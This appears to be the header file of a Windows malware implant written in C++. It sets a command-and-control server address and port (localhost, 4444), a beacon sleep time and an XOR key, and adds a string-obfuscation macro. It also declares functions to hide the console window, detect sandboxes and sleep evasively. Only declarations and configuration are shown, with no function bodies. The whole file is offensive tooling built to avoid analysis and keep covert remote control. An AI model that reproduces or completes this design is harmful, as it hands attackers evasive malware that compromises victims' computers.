#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <iostream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

// XOR String Obfuscation Macro
#define OBFUSCATE(str) XorString(str, sizeof(str) - 1, __LINE__)

// Configuration
#define C2_SERVER "127.0.0.1"
#define C2_PORT 4444
#define SLEEP_TIME 5000
#define XOR_KEY 0x42

// Function prototypes
void HideConsole();
bool IsSandbox();
void EvasiveSleep(DWORD ms);
std::string XorString(const char* str, size_t len, int key);